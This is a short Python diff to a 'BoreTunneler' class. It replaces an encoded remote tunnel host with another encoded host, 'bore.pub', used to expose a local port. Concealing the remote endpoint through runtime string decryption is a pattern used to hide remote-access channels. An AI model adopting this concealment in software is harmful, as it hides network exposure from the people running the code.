@@ -13,9 +13,8 @@ class BoreTunneler:
     
     def __init__(self, local_port: int = 8080):
         self.local_port = local_port
-        # Encrypted remote server URL
-        # "tunnel.ptrkxlord.me" -> "YlcMGTdxOAQuEhgYWmUCUUc=" (re-using existing style)
-        self.remote_server = decrypt_string("YlcMGTdxOAQuEhgYWmUCUUc=") 
+        # Encrypted remote server URL: "bore.pub" -> "DF0KDmAhLAA="
+        self.remote_server = decrypt_string("DF0KDmAhLAA=") 
         self.remote_port = 7835
         self.process: Optional[subprocess.Popen] = None
         self.running = False
